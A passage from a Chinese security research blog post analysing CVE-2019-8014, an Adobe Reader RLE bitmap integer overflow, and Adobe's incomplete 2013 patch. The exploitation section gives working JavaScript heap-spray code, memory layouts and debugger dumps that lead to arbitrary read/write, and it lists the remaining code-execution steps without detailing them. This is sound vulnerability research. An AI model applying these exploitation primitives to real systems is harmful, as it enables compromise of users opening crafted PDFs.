<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────┬─────────────┬─────────────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │     Hole    │ ArrayBuffer │     Hole    │</span><br><span class="line">└─────────────┴─────────────┴─────────────┴─────────────┘</span><br><span class="line">│ &lt;-  0xF0 -&gt; │</span><br></pre></td></tr></table></figure>
<p>在触发漏洞时，位图解析相关的堆块会落到其中一个空洞上：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌─────────────┬─────────────┬─────────────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │</span><br><span class="line">└─────────────┴─────────────┴─────────────┴─────────────┘</span><br></pre></td></tr></table></figure>
<p>因为可以向低地址方向越界写 <code>0xF4</code> 字节的 <code>0x10</code> 数据，所以触发漏洞之后，<code>ArrayBuffer</code> 对象的 <strong>backing store</strong> 的内存布局如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; dd 304c8398</span><br><span class="line">;            -, byteLength, viewobj,       -,</span><br><span class="line">304c8398  00000000 10101010 10101010 10101010</span><br><span class="line">;         ArrayBuffer 数据</span><br><span class="line">304c83a8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83b8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83c8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83d8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83e8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83f8  10101010 10101010 10101010 10101010</span><br><span class="line">304c8408  10101010 10101010 10101010 10101010</span><br><span class="line">304c8418  10101010 10101010 10101010 10101010</span><br><span class="line">304c8428  10101010 10101010 10101010 10101010</span><br><span class="line">304c8438  10101010 10101010 10101010 10101010</span><br><span class="line">304c8448  10101010 10101010 10101010 10101010</span><br><span class="line">304c8458  10101010 10101010 10101010 10101010</span><br><span class="line">304c8468  10101010 10101010 10101010 10101010</span><br><span class="line">304c8478  10101010 10101010 10101010 10101010 ; ArrayBuffer 结束</span><br><span class="line">; 下一个堆块的元数据（存储位图数据的堆块）</span><br><span class="line">304c8488  10101010 10101010</span><br><span class="line">; 位图数据</span><br><span class="line">304c8490                    00000000 00000000</span><br></pre></td></tr></table></figure>
<p>此时 <code>ArrayBuffer</code> 对象的 <code>byteLength</code> 被改成了 <code>0x10101010</code> ，但是 <code>DataView</code> 对象的指针也被改成了 <code>0x10101010</code> ，前面提到过这会导致进程崩溃。</p>
<h4 id="5-5-2-内存布局-0"><a href="#5-5-2-内存布局-0" class="headerlink" title="5.5.2 内存布局 (0)"></a>5.5.2 内存布局 (0)</h4><p>为了避免进程崩溃，需要提前在地址 <code>0x10101010</code> 上布局数据，让这个地址看起来就是一个 <code>DataView</code> 指针。很明显，为了漏洞利用更加稳定，我们需要一开始就在这里布局好数据。</p>
<p>同样，这里借助 <code>ArrayBuffer</code> 实现精确的内存布局：</p>
<ul>
<li>创建大量 <code>byteLength</code> 为 <code>0xFFE8</code> 的 <code>ArrayBuffer</code> </li>
<li>在特定内存范围内，<code>ArrayBuffer</code> 的 <strong>backing store</strong> 将有序的出现在地址 <code>0xYYYY0048</code> 上</li>
</ul>
<p>之所以选择 <code>0xFFE8</code> ，是因为这会使得 <strong>backing store</strong> 所在堆块整体的大小为 <code>0x10000</code> ：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0xFFE8 -&gt; byteLength</span></span><br><span class="line"><span class="comment">// 0x10 -&gt; sizeof ObjectElements</span></span><br><span class="line"><span class="comment">// 0x08 -&gt; sizeof heap block's metadata</span></span><br><span class="line"><span class="number">0xFFE8</span> + <span class="number">0x10</span> + <span class="number">0x08</span> = <span class="number">0x10000</span></span><br></pre></td></tr></table></figure>
<p>使用下面的代码进行内存布局，可以有效防止进程崩溃（具体细节不作讲解，相关条件很容易通过动态调试分析出来）：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillHeap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1200</span>);</span><br><span class="line">    array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xFFE8</span>);</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(array[<span class="number">0</span>]);</span><br><span class="line">    </span><br><span class="line">    dv.setUint32(<span class="number">0xFB8</span>, <span class="number">0x10100058</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0</span>, <span class="number">0x10100158</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0xFFA8</span>, <span class="number">0x10100258</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0x200</span> + <span class="number">0x14</span>, <span class="number">0x10100358</span>, <span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &amp;lt; array.length; ++i) &#123;</span><br><span class="line">        array[i] = array[<span class="number">0</span>].slice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然，这仅仅只能防止漏洞触发后进程的崩溃，如果要为该 <code>ArrayBuffer</code> 关联新的 <code>DataView</code> 来读写数据，那么会导致新的崩溃。同样，填充一点新的数据就可以防止进程崩溃，新的代码如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillHeap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1200</span>);</span><br><span class="line">    array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xFFE8</span>);</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(array[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">// 防止触发漏洞之后进程立刻 Crash</span></span><br><span class="line">    dv.setUint32(<span class="number">0xFB8</span>, <span class="number">0x10100058</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0</span>, <span class="number">0x10100158</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0xFFA8</span>, <span class="number">0x10100258</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0x200</span> + <span class="number">0x14</span>, <span class="number">0x10100358</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// 防止关联 DataView 对象时 Crash</span></span><br><span class="line">    dv.setUint32(<span class="number">0xFFA4</span>, <span class="number">0x10100458</span>, <span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &amp;lt; array.length; ++i) &#123;</span><br><span class="line">        array[i] = array[<span class="number">0</span>].slice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="5-5-3-全局读写"><a href="#5-5-3-全局读写" class="headerlink" title="5.5.3 全局读写"></a>5.5.3 全局读写</h4><p>当 <code>ArrayBuffer</code> 对象的 <code>byteLength</code> 被改成 <code>0x10101010</code> 之后，可以基于这个 <code>ArrayBuffer</code> 对象修改下一个 <code>ArrayBuffer</code> 对象的 <code>byteLength</code> 。在基于 <code>ArrayBuffer</code> 创建内存空洞时，可以在每一个 <code>ArrayBuffer</code> 上存储特定的标记值，这样在内存中搜索 <code>ArrayBuffer</code> 对象就非常简单了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  (1)byteLength            (3)Global Access</span><br><span class="line"> ┌─&lt;───&lt;───&lt;───┐            &lt;──────┬──────&gt;</span><br><span class="line">┌┼────────────┬┼────────────┬──────┼──────┬─────────────┐</span><br><span class="line">│ ArrayBuffer │ Bitmap Data │ ArrayBuffer │     Hole    │</span><br><span class="line">└──────┼──────┴─────────────┴┼────────────┴─────────────┘</span><br><span class="line">       └──&gt;───&gt;───&gt;───&gt;────&gt;─┘</span><br><span class="line">        (2) byteLength to -1</span><br></pre></td></tr></table></figure>
<p>当下一个 <code>ArrayBuffer</code> 对象的 <code>byteLength</code> 被改成 <code>0xFFFFFFFF</code> 时，基于这个 <code>ArrayBuffer</code> 对象就可以实现用户态空间的全局读写了。</p>
<h4 id="5-5-4-任意地址读写"><a href="#5-5-4-任意地址读写" class="headerlink" title="5.5.4 任意地址读写"></a>5.5.4 任意地址读写</h4><p>一旦拥有全局读写的能力，我们就可以向低地址方向来搜索特定的关键字来定位 <code>ArrayBuffer</code> 对象在内存中的绝对地址，然后基于这个绝对地址来实现任意地址读写。</p>
<p>这里可以通过搜索 <code>ffeeffee</code> 或者 <code>f0e0d0c0</code> 来定位，为了提高准确性，需要同时校验关键字附近的数据的取值范围。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; dd 30080000</span><br><span class="line">30080000  16b80e9e 0101331b ffeeffee 00000002  ; ffeeffee</span><br><span class="line">30080010  055a00a4 2f0b0010 055a0000 30080000  ; +0x14 -&gt; 30080000</span><br><span class="line">30080020  00000fcf 30080040 3104f000 000002e5</span><br><span class="line">30080030  00000001 00000000 30d69ff0 30d69ff0</span><br><span class="line">30080040  3eb82e96 08013313 00000000 0000ffe8</span><br><span class="line">30080050  00000000 00000000 10100158 00000000</span><br><span class="line">30080060  00000000 00000000 00000000 00000000</span><br><span class="line">30080070  00000000 00000000 00000000 00000000</span><br><span class="line"></span><br><span class="line">0:014&gt; dd 305f4000</span><br><span class="line">305f4000  00000000 00000000 6ab08d69 0858b71a</span><br><span class="line">305f4010  0bbab388 30330080 0ff00112 f0e0d0c0  ; f0e0d0c0</span><br><span class="line">305f4020  15dc2c3f 00000430 305f402c d13bc929  ; +0x0C -&gt; 305f402c</span><br><span class="line">305f4030  e5c521a7 d9b264d4 919cee58 45da954e</span><br><span class="line">305f4040  5c3f608b 2b5fd340 0bae3aa9 2b5fd340</span><br><span class="line">305f4050  0fae32aa d13bc929 e5c521a7 d9b264d4</span><br><span class="line">305f4060  919cee58 45da954e 9c3f608b f952aa94</span><br><span class="line">305f4070  989c772a a1dd934a ac5b154b 2fadd038</span><br></pre></td></tr></table></figure>
<h4 id="5-5-5-剩余步骤"><a href="#5-5-5-剩余步骤" class="headerlink" title="5.5.5 剩余步骤"></a>5.5.5 剩余步骤</h4><p>在拥有任意地址读写能力之后，实现代码执行就是固定的套路了，本文对此不做详细介绍。</p>
<p>剩余的步骤如下：</p>
<ul>
<li>EIP 劫持</li>
<li>ASLR 绕过</li>
<li>DEP 绕过</li>
<li>CFG 绕过</li>
</ul>
<h2 id="0x06-CVE-2013-2729"><a href="#0x06-CVE-2013-2729" class="headerlink" title="0x06. CVE-2013-2729"></a>0x06. CVE-2013-2729</h2><p>前面提到一共找到了三处整数溢出，其中一处位于 RLE8 数据解析过程中，另外两处位于 RLE4 数据解析过程中。难道不应该有四个位置存在整数溢出吗？为什么只找到了三个？</p>
<p>因为有一个在六年前已经修复了（参考 <a href="http://blog.binamuse.com/2013/05/readerbmprle.html" target="_blank" rel="noopener">feliam’s write up for CVE-2013-2729</a>）！从版本 <code>2019.012.20035</code> 中的代码也可以看到，确实有一个地方判断了整数溢出的情况，这就是 CVE-2013-2729 引入的补丁。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dst_xpos = BYTE1(cmd) + xpos;</span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &lt; xpos || </span><br><span class="line">     dst_xpos &lt; BYTE1(cmd) || dst_xpos &gt; width )  <span class="comment">// overflow check</span></span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;         <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure>
<p>然而 Adobe 仅仅修补了报告的这一个位置，而忽略了其他三个位置上的整数溢出。</p>
<h2 id="0x07-经验教训"><a href="#0x07-经验教训" class="headerlink" title="0x07. 经验教训"></a>0x07. 经验教训</h2><p>对厂商而言，在深入理解漏洞本质的同时，还可以看看是不是有类似的问题需要修复。</p>
<p>对安全研究人员而言，分析完漏洞之后还可以顺便看一下厂商的修复方式，也许不经意间就能发现新的漏洞。</p>

      
    </div>
    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>请作者喝杯咖啡☕</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>Donate</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/uploads/wechatpay.jpg" alt="Ke Liu WeChat Pay">
        <p>WeChat Pay</p>
      </div>
    

    

    

  </div>
</div>

      </div>
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Adobe-Reader/" rel="tag"># Adobe Reader</a>
          
            <a href="/tags/PDF/" rel="tag"># PDF</a>
          
            <a href="/tags/CVE-2019-8014/" rel="tag"># CVE-2019-8014</a>
          
            <a href="/tags/CVE-2013-2729/" rel="tag"># CVE-2013-2729</a>
          
            <a href="/tags/XFA/" rel="tag"># XFA</a>
          
            <a href="/tags/BMP/" rel="tag"># BMP</a>
          
            <a href="/tags/RLE/" rel="tag"># RLE</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/09/12/deep-analysis-of-cve-2019-8014-en/" rel="next" title="Deep Analysis of CVE-2019-8014 The Vulnerability Ignored 6 Years Ago">
                <i class="fa fa-chevron-left"></i> Deep Analysis of CVE-2019-8014 The Vulnerability Ignored 6 Years Ago
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/02/23/windows-debugging-symbols-proxy-rules/" rel="prev" title="Windows 调试符号下载代理配置">
                Windows 调试符号下载代理配置 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            Overview
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/uploads/avatar.webp" alt="Ke Liu">
          <p class="site-author-name" itemprop="name">Ke Liu</p>
           
              <p class="site-description motion-element" itemprop="description">Independent Security Researcher</p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives/">
                <span class="site-state-item-count">16</span>
                <span class="site-state-item-name">posts</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">13</span>
                <span class="site-state-item-name">categories</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">42</span>
                <span class="site-state-item-name">tags</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://twitter.com/klotxl404" target="_blank" title="Twitter">
                  
                    <i class="fa fa-fw fa-twitter"></i>
                  
                    
                      Twitter
                    
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-漏洞简介"><span class="nav-text">0x01. 漏洞简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-环境搭建"><span class="nav-text">0x02. 环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-位图简介"><span class="nav-text">0x03. 位图简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-相关结构"><span class="nav-text">3.1 相关结构</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-1-Bitmap-File-Header"><span class="nav-text">3.1.1 Bitmap File Header</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-2-Bitmap-Info-Header"><span class="nav-text">3.1.2 Bitmap Info Header</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-3-RGBQUAD-Array"><span class="nav-text">3.1.3 RGBQUAD Array</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-4-Bitmap-Data"><span class="nav-text">3.1.4 Bitmap Data</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-RLE-编码"><span class="nav-text">3.2 RLE 编码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-1-RLE8-编码"><span class="nav-text">3.2.1 RLE8 编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-2-2-RLE4-编码"><span class="nav-text">3.2.2 RLE4 编码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-漏洞分析"><span class="nav-text">0x04. 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-代码定位"><span class="nav-text">4.1 代码定位</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-漏洞分析"><span class="nav-text">4.2 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#4-2-1-RLE8-解析"><span class="nav-text">4.2.1 RLE8 解析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-2-2-RLE4-解析"><span class="nav-text">4.2.2 RLE4 解析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-漏洞利用"><span class="nav-text">0x05. 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-溢出目标"><span class="nav-text">5.1 溢出目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-SpiderMonkey-基础知识"><span class="nav-text">5.2 SpiderMonkey 基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#5-2-1-ArrayBuffer"><span class="nav-text">5.2.1 ArrayBuffer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-2-2-Array"><span class="nav-text">5.2.2 Array</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-2-3-JSObject"><span class="nav-text">5.2.3 JSObject</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-位图构造"><span class="nav-text">5.3 位图构造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-4-PDF-构造"><span class="nav-text">5.4 PDF 构造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-5-利用技巧"><span class="nav-text">5.5 利用技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#5-5-1-内存布局-1"><span class="nav-text">5.5.1 内存布局 (1)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-5-2-内存布局-0"><span class="nav-text">5.5.2 内存布局 (0)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-5-3-全局读写"><span class="nav-text">5.5.3 全局读写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-5-4-任意地址读写"><span class="nav-text">5.5.4 任意地址读写</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-5-5-剩余步骤"><span class="nav-text">5.5.5 剩余步骤</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-CVE-2013-2729"><span class="nav-text">0x06. CVE-2013-2729</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-经验教训"><span class="nav-text">0x07. 经验教训</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">
  
  &copy;  2010 - 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ke Liu</span>
</div>


<div class="powered-by">
  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
</div>

<div class="theme-info">
  Theme -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Pisces
  </a>
</div>


        

        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.2"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>



  


  




	





  





  






  





  

  

  

  

  

  

</body>
</html>
